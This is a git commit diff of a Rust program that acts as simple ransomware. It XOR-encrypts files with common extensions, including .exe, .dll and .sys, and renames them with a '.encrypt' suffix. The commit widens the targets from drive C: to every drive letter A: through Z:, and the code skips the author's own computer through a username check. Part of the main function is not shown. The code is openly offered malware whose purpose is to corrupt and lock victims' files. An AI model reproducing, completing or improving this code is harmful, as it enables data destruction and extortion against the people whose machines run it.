c05f1f51b9a0965c5ba8f620a437c3be6f52c020
极诣·剑魂 <84119280+helloobaby@users.noreply.github.com>
2022-12-20 16:30:35 +0800

    complete rust version and format code

--- method1_rust/src/main.rs
+++ method1_rust/src/main.rs
@@ -2,38 +2,35 @@
 
 use lazy_static::lazy_static;
 use std::fs;
-use std::{str, vec};
-use walkdir::{self, WalkDir,Error};
 use std::path::Path;
-
-
-
+use std::{str, vec};
+use walkdir::{self, Error, WalkDir};
 
 lazy_static! {
     static ref kIncludeBackfix: Vec<&'static str> =
         vec![".exe", ".dll", ".png", ".jpg", ".bmp", ".txt", ".ini", ".sys"];
-    static ref kHardDriver: Vec<&'static str> = vec!["C:"];
+    static ref kHardDriver: Vec<&'static str> = vec![
+        "A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:",
+        "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"
+    ];
 }
 
-pub fn encrypt_buffer(v:& mut Vec<u8>) {
-
-    for byte in v.iter_mut(){
-        *byte  = *byte ^ 0x7A;
+pub fn encrypt_buffer(v: &mut Vec<u8>) {
+    for byte in v.iter_mut() {
+        *byte = *byte ^ 0x7A;
     }
-
 }
 
-pub fn encrypt_file(path : &Path) {
+pub fn encrypt_file(path: &Path) {
     let mut buffer = fs::read(path).expect("");
     encrypt_buffer(&mut buffer);
     fs::write(path, buffer);
-    fs::rename(path, format!("{}.encrypt",path.display()));
+    fs::rename(path, format!("{}.encrypt", path.display()));
 }
 
-fn main() -> Result<(),Error>{
-
-    // this is my computer 
-    if whoami::realname() == "asdf"{
+fn main() -> Result<(), Error> {
+    // this is my computer
+    if whoami::realname() == "asdf" {
         println!("Host Computer\n");
         return Ok(());
     }
@@ -58,6 +55,4 @@ fn main() -> Result<(),Error>{
     }
 
     Ok(())
-
-
 }
